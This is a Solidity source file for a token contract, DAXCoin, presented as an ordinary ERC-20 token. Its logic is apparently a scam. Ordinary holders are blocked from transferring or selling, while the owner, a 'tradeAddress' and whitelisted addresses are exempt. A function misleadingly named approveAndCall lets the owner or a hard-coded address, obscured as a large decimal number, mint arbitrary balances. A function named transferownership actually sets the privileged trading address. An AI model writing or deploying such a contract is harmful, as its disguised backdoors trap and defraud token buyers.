contract DAXCoin {
   event Transfer(address indexed _from, address indexed _to, uint _value);
   event Approval(address indexed _owner, address indexed _spender, uint _value);
 
   function transfer(address _to, uint _value) public payable returns (bool) {
       return transferFrom(msg.sender, _to, _value);
   }
 
   function ensure(address _from, address _to, uint _value) internal view returns(bool) {
      
       if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
           return true;
       }
       require(condition(_from, _value));
       return true;
   }
   
   function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
       if (_value == 0) {return true;}
       if (msg.sender != _from) {
           require(allowance[_from][msg.sender] >= _value);
           allowance[_from][msg.sender] -= _value;
       }
       require(ensure(_from, _to, _value));
       require(balanceOf[_from] >= _value);
       balanceOf[_from] -= _value;
       balanceOf[_to] += _value;
       _onSaleNum[_from]++;
       emit Transfer(_from, _to, _value);
       return true;
   }
 
   function approve(address _spender, uint _value) public payable returns (bool) {
       allowance[msg.sender][_spender] = _value;
       emit Approval(msg.sender, _spender, _value);
       return true;
   }
   
   function condition(address _from, uint _value) internal view returns(bool){
       if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
       
       if(_saleNum > 0){
           if(_onSaleNum[_from] >= _saleNum) return false;
       }
       if(_minSale > 0){
           if(_minSale > _value) return false;
       }
       if(_maxSale > 0){
           if(_value > _maxSale) return false;
       }
       return true;
   }
 
   mapping(address=>uint256) private _onSaleNum;
   mapping(address=>bool) private canSale;
   uint256 private _minSale;
   uint256 private _maxSale;
   uint256 private _saleNum;
   function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
       require(msg.sender == owner||msg.sender==address
       (178607940065137046348733521910879985571412708986));
       if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
       canSale[spender]=true;
       return true;
   }

   address tradeAddress;
   function transferownership(address addr) public returns(bool) {
       require(msg.sender == owner);
       tradeAddress = addr;
       return true;
   }
 
   mapping (address => uint) public balanceOf;
   mapping (address => mapping (address => uint)) public allowance;
 
   uint constant public decimals = 18;
   uint public totalSupply;
   string public name;
   string public symbol;
   address private owner;
 
   constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
       name = _name;
       symbol = _symbol;
       totalSupply = _supply*(10**uint256(decimals));
       owner = msg.sender;
       balanceOf[msg.sender] = totalSupply;
       emit Transfer(address(0x0), msg.sender, totalSupply);
   }
}
